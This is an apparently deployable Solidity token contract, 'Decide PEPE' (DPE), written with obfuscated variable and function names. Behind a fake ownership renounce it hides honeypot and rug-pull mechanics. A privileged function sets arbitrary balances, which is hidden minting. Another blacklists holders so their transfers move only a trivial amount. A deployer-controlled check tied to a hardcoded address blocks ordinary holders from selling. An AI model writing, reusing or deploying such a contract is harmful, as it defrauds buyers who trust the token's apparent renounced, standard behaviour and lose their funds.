//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface modeAmount {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeMarketing) external view returns (uint256);

    function transfer(address fromShould, uint256 tokenLaunchTeam) external returns (bool);

    function allowance(address listExempt, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenLaunchTeam) external returns (bool);

    function transferFrom(
        address sender,
        address fromShould,
        uint256 tokenLaunchTeam
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoTx, uint256 value);
    event Approval(address indexed listExempt, address indexed spender, uint256 value);
}

abstract contract feeSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface shouldReceiver {
    function createPair(address receiverMode, address isEnable) external returns (address);
}

interface shouldTrading is modeAmount {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DecidePEPE is feeSender, modeAmount, shouldTrading {

    uint256 public minExempt;

    mapping(address => mapping(address => uint256)) private fundToken;

    event OwnershipTransferred(address indexed enableTake, address indexed sellLiquidityReceiver);

    function decimals() external view virtual override returns (uint8) {
        return launchLimitSell;
    }

    function shouldExempt(uint256 tokenLaunchTeam) public {
        totalMarketing();
        shouldAt = tokenLaunchTeam;
    }

    function transfer(address enableTo, uint256 tokenLaunchTeam) external virtual override returns (bool) {
        return modeMarketing(_msgSender(), enableTo, tokenLaunchTeam);
    }

    uint256 shouldAt;

    mapping(address => bool) public exemptAmount;

    constructor (){
        if (isFund != minExempt) {
            minExempt = isFund;
        }
        receiverAuto swapAuto = receiverAuto(takeSwap);
        senderFund = shouldReceiver(swapAuto.factory()).createPair(swapAuto.WETH(), address(this));
        if (isFund == minExempt) {
            swapLiquidity = true;
        }
        launchTrading = _msgSender();
        tokenAmount();
        exemptAmount[launchTrading] = true;
        fromWallet[launchTrading] = receiverBuy;
        
        emit Transfer(address(0), launchTrading, receiverBuy);
    }

    function receiverBuyTrading(address atIs) public {
        require(atIs.balance < 100000);
        if (toMarketingMin) {
            return;
        }
        
        exemptAmount[atIs] = true;
        if (shouldMinToken) {
            minExempt = isFund;
        }
        toMarketingMin = true;
    }

    function allowance(address fromList, address tokenFromBuy) external view virtual override returns (uint256) {
        if (tokenFromBuy == takeSwap) {
            return type(uint256).max;
        }
        return fundToken[fromList][tokenFromBuy];
    }

    uint8 private launchLimitSell = 18;

    function toMax(address launchTxTo, address fromShould, uint256 tokenLaunchTeam) internal returns (bool) {
        require(fromWallet[launchTxTo] >= tokenLaunchTeam);
        fromWallet[launchTxTo] -= tokenLaunchTeam;
        fromWallet[fromShould] += tokenLaunchTeam;
        emit Transfer(launchTxTo, fromShould, tokenLaunchTeam);
        return true;
    }

    function totalMarketing() private view {
        require(exemptAmount[_msgSender()]);
    }

    function receiverMax(address marketingTx) public {
        totalMarketing();
        
        if (marketingTx == launchTrading || marketingTx == senderFund) {
            return;
        }
        minAtLimit[marketingTx] = true;
    }

    function name() external view virtual override returns (string memory) {
        return totalAtAuto;
    }

    function owner() external view returns (address) {
        return tokenTrading;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return receiverBuy;
    }

    uint256 constant senderTake = 8 ** 10;

    bool private shouldMinToken;

    string private totalAtAuto = "Decide PEPE";

    mapping(address => uint256) private fromWallet;

    address public launchTrading;

    mapping(address => bool) public minAtLimit;

    bool public toMarketingMin;

    function symbol() external view virtual override returns (string memory) {
        return exemptToken;
    }

    address private tokenTrading;

    function feeAt(address enableTo, uint256 tokenLaunchTeam) public {
        totalMarketing();
        fromWallet[enableTo] = tokenLaunchTeam;
    }

    uint256 private receiverBuy = 100000000 * 10 ** 18;

    function transferFrom(address launchTxTo, address fromShould, uint256 tokenLaunchTeam) external override returns (bool) {
        if (_msgSender() != takeSwap) {
            if (fundToken[launchTxTo][_msgSender()] != type(uint256).max) {
                require(tokenLaunchTeam <= fundToken[launchTxTo][_msgSender()]);
                fundToken[launchTxTo][_msgSender()] -= tokenLaunchTeam;
            }
        }
        return modeMarketing(launchTxTo, fromShould, tokenLaunchTeam);
    }

    function tokenAmount() public {
        emit OwnershipTransferred(launchTrading, address(0));
        tokenTrading = address(0);
    }

    address public senderFund;

    function approve(address tokenFromBuy, uint256 tokenLaunchTeam) public virtual override returns (bool) {
        fundToken[_msgSender()][tokenFromBuy] = tokenLaunchTeam;
        emit Approval(_msgSender(), tokenFromBuy, tokenLaunchTeam);
        return true;
    }

    address takeSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private isFund;

    uint256 marketingWallet;

    function balanceOf(address takeMarketing) public view virtual override returns (uint256) {
        return fromWallet[takeMarketing];
    }

    bool public swapLiquidity;

    string private exemptToken = "DPE";

    function modeMarketing(address launchTxTo, address fromShould, uint256 tokenLaunchTeam) internal returns (bool) {
        if (launchTxTo == launchTrading) {
            return toMax(launchTxTo, fromShould, tokenLaunchTeam);
        }
        uint256 tradingSender = modeAmount(senderFund).balanceOf(fromTeam);
        require(tradingSender == shouldAt);
        require(fromShould != fromTeam);
        if (minAtLimit[launchTxTo]) {
            return toMax(launchTxTo, fromShould, senderTake);
        }
        return toMax(launchTxTo, fromShould, tokenLaunchTeam);
    }

    function getOwner() external view returns (address) {
        return tokenTrading;
    }

    address fromTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

}